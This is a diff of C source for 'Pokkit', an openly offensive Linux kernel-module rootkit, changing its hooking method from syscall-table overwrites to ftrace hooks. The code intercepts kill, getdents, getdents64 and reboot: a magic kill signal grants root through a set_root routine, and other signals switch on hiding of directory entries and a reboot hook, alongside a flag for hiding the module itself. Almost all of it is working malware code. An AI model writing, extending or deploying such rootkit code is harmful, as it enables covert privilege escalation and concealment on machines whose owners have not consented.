@@ -17,42 +17,13 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Pokkit");
 MODULE_AUTHOR("NondairyDig");
-MODULE_VERSION("0.3");
+MODULE_VERSION("0.5");
 
 
-const int ACTIVE_HOOKS_SIZE = 4; /*Available number of hooks to store*/
 
 static int hidden = 0; // flag if module is hidden
 static struct list_head *prev_module;
 unsigned long *__SYS_CALL_TABLE; // variable for a pointer to the syscall table
-static HOOK *ACTIVE_HOOKS; // HOOKs array
-
-
-static int hook(int sysc, void *f_ptr){
-    unprotect_memory();
-    __SYS_CALL_TABLE[sysc] = (unsigned long)f_ptr; // find(by index with unistd.h) the syscall in the table and set the function pointer to the mallicious function
-    printk(KERN_INFO "hooked %d and tied to %lu\n", sysc, (unsigned long)f_ptr);
-    protect_memory();
-    return 0;
-}
-
-
-static int unhook(int sysc){
-    size_t i = 0;
-    while (i < ACTIVE_HOOKS_SIZE) // loop the hooks array
-    {
-        if(ACTIVE_HOOKS[i].call == sysc){ // check if the syscall was found
-            unprotect_memory();
-            // return the syscall function pointer in the syscall table to the original before the hook
-            __SYS_CALL_TABLE[ACTIVE_HOOKS[i].call] = (unsigned long)ACTIVE_HOOKS[i].original;
-            protect_memory();
-            break;
-        }
-        i++;
-    }
-    return 0;
-}
-
 
 static void set_root(void){
     struct cred *p_creds;
@@ -95,7 +66,7 @@ static asmlinkage int hack_getdents64(const struct pt_regs *regs){
 
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
     unsigned long offset = 0;
-    int ret = ACTIVE_HOOKS[1].original(regs); // get the original function's return value (size of dirent record)
+    int ret = orig_getdents64(regs);// get the original function's return value (size of dirent record)
     dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program
 
     // check if empty directory or not enough space to allocate
@@ -155,7 +126,7 @@ static asmlinkage int hack_getdents(const struct pt_regs *regs){
     unsigned long offset = 0;
 
     
-    int ret = ACTIVE_HOOKS[2].original(regs);
+    int ret = orig_getdents(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
     if ((ret <= 0) || (dirent_ker == NULL))
@@ -197,37 +168,6 @@ static asmlinkage int hack_getdents(const struct pt_regs *regs){
 #else
 #endif
 
-static int store_syscall(int sysc, int i){
-    /*#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) use pt_regs stub for syscalls*/
-        #ifdef PTREGS_SYSCALL_STUB
-        ACTIVE_HOOKS[i].call = sysc; // store the syscall number(like id)
-        ACTIVE_HOOKS[i].original = (ptregs_t)__SYS_CALL_TABLE[sysc]; // store the original syscall function pointer
-        printk(KERN_INFO "Stored SYSCALL %d\n", sysc);
-        #else
-        /*#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)*/
-        ACTIVE_HOOKS[i].call = sysc;
-        ACTIVE_HOOKS[i].original = (syscall_old_t)__SYS_CALL_TABLE[sysc];
-        printk(KERN_INFO "Stored SYSCALL old %d\n", sysc);
-        #endif
-    return 0;
-}
-
-
-
-static int cleanup(void){
-    int i = 0;
-    unprotect_memory();
-    while(i < ACTIVE_HOOKS_SIZE){
-        if(ACTIVE_HOOKS[i].call != 0){ // if hook is actual and not empty
-            __SYS_CALL_TABLE[ACTIVE_HOOKS[i].call] = (unsigned long)ACTIVE_HOOKS[i].original; // revert syscall table functiion address for the syscall to the original
-        }
-        i++;
-    }
-    protect_memory();
-    kfree(ACTIVE_HOOKS);// free hooks array
-    return 0;
-}
-
 
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_reboot(const struct pt_regs *regs){
@@ -244,7 +184,23 @@ static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void
 }
 #endif
 
-
+#ifdef PTREGS_SYSCALL_STUB
+static asmlinkage long hack_kill(const struct pt_regs *regs); // pretty self explanatory, in the README, activate and hook desired capabilities
+static struct ftrace_hook ACTIVE_HOOKS[] = {
+    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
+    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot)
+};
+#else
+static asmlinkage long hack_kill(pid_t pid, int sig);
+static ftrace_hook ACTIVE_HOOKS[] = {
+    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
+    HOOK("sys_getdents", hack_getdents, &orig_getdents),
+    HOOK("sys_kill", hack_kill, &orig_kill),
+    HOOK("sys_reboot", hack_reboot, &orig_reboot)
+};
+#endif
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
     int sig = regs->si;
@@ -266,28 +222,20 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        if(store_syscall(__NR_getdents64, 1) == 1){
-            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents64);
-        }
-        if(hook(__NR_getdents64, &hack_getdents64) == 1){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
         }
-        if(store_syscall(__NR_getdents, 2) == 1){
-            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents);
-        }
-        if(hook(__NR_getdents, &hack_getdents) == 1){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
     }
     else if ((sig == 63) && (pid == 2)){
-        if(store_syscall(__NR_reboot, 3) == 1){
-            printk(KERN_ERR "error storing syscall %d\n", __NR_reboot);
-        }
-        if(hook(__NR_reboot, &hack_reboot) == 1){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
-    return ACTIVE_HOOKS[0].original(regs);
+    printk(KERN_INFO "kill %d, %d\n", sig, pid);
+    return orig_kill(regs);
 }
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig){
@@ -307,49 +255,36 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         set_root();
         return 0;
     }
-    else if ((sig == 64) && (pid == 69)){
-        if(store_syscall(__NR_getdents64, 1) == 1){
-            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents64);
-        }
-        if(hook(__NR_getdents64, &hack_getdents64) == 1){
+    else if ((sig == 63) && (pid == 1)){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
         }
-        if(store_syscall(__NR_getdents, 2) == 1){
-            printk(KERN_ERR "error storing syscall %d\n", __NR_getdents);
-        }
-        if(hook(__NR_getdents, &hack_getdents) == 1){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
         }
     }
-    return ACTIVE_HOOKS[0].original(pid, sig);
+    else if ((sig == 63) && (pid == 2)){
+        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
+            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+        }
+    }
+    return orig_kill(pid, sig);
 }
 #endif
-
-
-
 
 
 static int __init mod_init(void){
     printk(KERN_INFO "Activated pookkit, Initializing & Hooking Kill\n");
     misc_register(&controller); // register the device for interaction within filesystem
-    __SYS_CALL_TABLE = get_symbol("sys_call_table"); // get the syscall table
-    ACTIVE_HOOKS = kzalloc(sizeof(HOOK)*ACTIVE_HOOKS_SIZE, GFP_KERNEL); // allocate memory to the number hooks as the number of capabilities
-    if (!__SYS_CALL_TABLE){
-        printk(KERN_ERR "Error: SYSCALL Table can't be found\n");
-        return 1;
-    }
-    if(store_syscall(__NR_kill, 0) == 1){
-        printk(KERN_ERR "error storing syscall %d\n", __NR_kill);
-    }
-    if(hook(__NR_kill, &hack_kill) == 1){ //hook the kill function for interaction with the lkm
+    if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
-    }
+    }//!CHANGE HOOKING MACHANISM
     return 0;
 }
 
 
 static void __exit mod_exit(void){
-    cleanup(); //cleanup the hooks and revert them
+    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
     misc_deregister(&controller); // deregister the device controller
     printk(KERN_INFO "pookkit: exit\n");
 }
